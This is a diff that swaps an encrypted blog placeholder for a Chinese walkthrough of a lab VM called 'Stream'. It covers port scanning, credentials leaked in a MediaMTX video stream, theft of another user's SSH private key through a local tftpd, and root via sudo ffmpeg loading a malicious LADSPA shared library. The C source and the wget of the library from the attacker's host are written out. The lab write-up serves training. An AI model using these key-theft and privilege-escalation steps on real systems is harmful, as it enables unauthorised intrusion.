@@ -1,5 +1,166 @@
-<!-- ##{"script":"<script src='https://7r1umphk.github.io/plugins/jiami.js'></script>"}## -->
-<!--encrypt: 04cff78d-->
-<!--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-->
-<!--/encrypt-->
-遇到问题先自己解决。
+# 端口探测与服务识别
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l                           
+[sudo] password for kali:                                          
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
+192.168.205.146 08:00:27:9a:8f:65       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:f3:f9:f8       VMware, Inc.
+```
+
+扫出目标IP是 192.168.205.146，直接上全端口扫描摸一下底。
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p 0-65535 192.168.205.146
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 07:24 -0500
+Nmap scan report for 192.168.205.146
+Host is up (0.0013s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1935/tcp open  rtmp
+8554/tcp open  rtsp-alt
+8888/tcp open  sun-answerbook
+8889/tcp open  ddi-tcp-2
+MAC Address: 08:00:27:9A:8F:65 (Oracle VirtualBox virtual NIC)
+```
+
+看到 1935、8554 这种端口，基本能判定是个流媒体服务器了。为了摸清具体跑了什么应用，接着对这几个开放端口做精准的版本和脚本探测。
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -sV -sC -p22,80,1935,8554,8888,8889 192.168.205.146
+...
+8888/tcp open  http    Golang net/http server
+|_http-server-header: mediamtx
+...
+8889/tcp open  http    Golang net/http server
+|_http-server-header: mediamtx
+...
+```
+
+重点落在 8888 和 8889 端口上，指纹显示跑的是 MediaMTX，这是一个基于 Golang 的开源流媒体服务器。
+
+# 初始突破：截取视频流凭证
+
+MediaMTX 默认通常需要提供一个流名称（stream path）才能访问内容。当时我随手猜了个最常见的默认路径。
+
+直接用浏览器访问了 `http://192.168.205.146:8888/live/`。运气不错猜对了，画面里在循环播放一段视频，里面直接带了一个凭证。靠单身多年的手速截了个屏，拿到了账号密码 `alvinchan: ferdinando`。
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh alvinchan@192.168.205.146              
+...
+alvinchan@192.168.205.146's password: 
+              _                        
+__      _____| | ___ ___  _ __ ___   ___ 
+\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
+ \ V  V /  __/ | (_| (_) | | | | | |  __/
+  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
+                                       
+alvinchan@Stream:~$ sudo -l
+...
+[sudo] password for alvinchan: 
+Sorry, user alvinchan may not run sudo on Stream.
+```
+
+拿到的凭证直接用来撞 SSH，成功拿到初始 shell。习惯性敲个 `sudo -l`，不出意外地失败了。
+
+# 本地信息收集与横向移动
+
+既然没法直接提权，就先翻看系统里的进程列表，找找有没有本地高权限运行的可疑服务。
+
+```bash
+alvinchan@Stream:/tmp$ ps aux
+...
+ 2432 root      0:00 /usr/sbin/in.tftpd -l -l -s /home/treadin -a 127.0.0.1 -u treadin -p
+...
+```
+
+发现本地起了个 tftpd 服务，绑在 127.0.0.1，而且指定了运行目录是 `/home/treadin`。既然在这个目录里，我第一反应就是去拿另一个用户的 SSH 私钥。
+
+```bash
+alvinchan@Stream:/tmp$ tftp 127.0.0.1
+tftp> get .ssh/id_rsa
+Error code 1: File not found
+tftp> get .ssh/id_ed25519
+tftp> quit
+alvinchan@Stream:/tmp$ ls -la
+...
+-rw-r--r--    1 alvinchan alvinchan       411 Mar  4 20:53 id_ed25519
+-rw-r--r--    1 alvinchan alvinchan         0 Mar  4 20:53 id_rsa
+```
+
+尝试获取 `id_rsa` 报错说文件不存在，换成较新的 `id_ed25519` 成功拉下来了。
+
+```bash
+alvinchan@Stream:/tmp$ chmod 600 id_ed25519 
+alvinchan@Stream:/tmp$ ssh treadin@127.0.0.1 -i id_ed25519 
+...                                     
+treadin@Stream:~$ id
+uid=1001(treadin) gid=1001(treadin) groups=1001(treadin)
+```
+
+给私钥改一下 600 权限，直接在靶机内部 SSH 登录到 treadin 用户，横向移动搞定。
+
+# FFmpeg 动态库劫持提权
+
+拿到新用户的shell后，再次检查 sudo 权限配置。
+
+```bash
+treadin@Stream:~$ sudo -l
+Matching Defaults entries for treadin on Stream:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for treadin:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+
+User treadin may run the following commands on Stream:
+    (ALL) NOPASSWD: /usr/bin/ffmpeg
+```
+
+发现 treadin 可以免密以 root 身份运行 ffmpeg。查了一下 GTFOBins，ffmpeg 支持通过加载外部的 LADSPA 插件（本质上就是动态链接库）来执行系统命令。准备写个恶意 so 文件，但发现靶机上没有 gcc 环境。
+
+```c
+┌──(kali㉿kali)-[/tmp]
+└─$ cat lib.c         
+#include <unistd.h>
+__attribute__((constructor)) void init(){setuid(0);setgid(0);execl("/bin/sh","sh",0);}
+
+┌──(kali㉿kali)-[/tmp]
+└─$ gcc -w -fPIC -shared -o lib.so lib.c
+```
+
+没办法只能在我的 Kali 上写好代码编译。这段 C 代码利用 `constructor` 属性，让动态库在被加载时优先执行，把 uid 和 gid 设置为 0 然后弹一个 sh。编译成共享库 `lib.so`。
+
+```bash
+treadin@Stream:/tmp$ wget 192.168.205.128/lib.so
+...
+'lib.so' saved
+treadin@Stream:/tmp$ chmod +x lib.so
+treadin@Stream:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i anullsrc -af ladspa=file=/tmp/lib.so /tmp/x.wav
+...
+Input #0, lavfi, from 'anullsrc':
+  Duration: N/A, start: 0.000000, bitrate: 705 kb/s
+  Stream #0:0: Audio: pcm_u8, 44100 Hz, stereo, u8, 705 kb/s
+root@Stream:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+在靶机上把编译好的库 wget 下来并赋权。执行这串配置了 LADSPA 滤镜的 ffmpeg 命令，成功触发了我们写的动态库，弹出了 root shell。
+
+```bash
+root@Stream:/tmp# cat /root/root.txt /home/
+.status     alvinchan/  treadin/
+root@Stream:/tmp# cat /root/root.txt /home/alvinchan/user.txt 
+flag{root-6235d8e489b3320dc6636e0fa97984e9}
+flag{user-ea08aa574d3cf3e682932bc3b66cbe6f}
+```
+
+翻了下 root 目录和 alvinchan 的家目录，顺利读到两个 flag。
